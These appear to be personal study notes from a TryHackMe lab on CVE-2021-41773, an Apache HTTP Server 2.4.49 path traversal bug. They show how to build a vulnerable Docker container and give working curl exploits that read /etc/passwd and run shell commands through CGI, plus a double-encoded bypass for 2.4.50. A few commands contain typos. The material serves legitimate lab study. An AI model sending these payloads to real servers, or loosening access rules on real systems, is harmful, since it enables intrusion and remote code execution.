# room
https://tryhackme.com/room/cve202141773

# task 1 - history
* cve-2021-41773 - apache http server v.2.4.49 path traversal attack
* flaw in path normalization
* attacker can use path traversal to map URLs to files outside the expected document root
* if files outside document root are not protected by "require all denied" the requests succeed

# task 2 - path traversal
* a path traversal exploit is an attack that aism to access resources that are normally inaccessible by abusing falws in path resolution and normalization
* normalization
    * absolute path
    * canonical path
    * relative path
* url encoding
    * https://datatracker.ietf.org/doc/html/rfc3986
    * RFC 3986
    * a scheme used to encode special or reserved characters within a URL
    * https://www.w3schools.com/tags/ref_urlencode.asp

# task 3 - review
* vulnerable test
    * docker pull httpd:2.4.49
    * docker run --name vuln-httpd -p 8080:80 -d httpd:2.4.49
    * docker cp vuln-httpd:/usr/local/apache2/conf/httpd.conf .
    * grep -C4 -n "Require all denied" httpd.conf
    * sed "250s/denied/granted/" httpd.conf > httpd.new.conf
    * docker cp http.new.conf vuln-httpd:/usr/local/apache2/conf/httpd.conf
    * docker container restart vuln-httpd
* vulnerable rce
    * docker cp vuln-httpd:/usr/local/apache2/conf/httpd.conf .
    * grep -C4 -n "mod_cgi" httpd.conf
    * sed "184,187s/#//" httpd.conf > httpd.new.conf
    * docker cp httpnew.conf vuln-httpd:/usr/local/apache2/conf/httpd.conf
    * docker container restart vuln-http
* exploit
    * 2.4.49 without CGI enabled
        * curl -v 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
    * 2.4.49 with CGI enabled
        * curl -v 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d "echo Content-Type: text/plain; echo; cat /etc/passwd" -H "Content-Type: text/plain"
    * 2.4.50 - double encoded
        * curl 'http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd

# task 4 - practical
* practical tasks using what is learned in section 3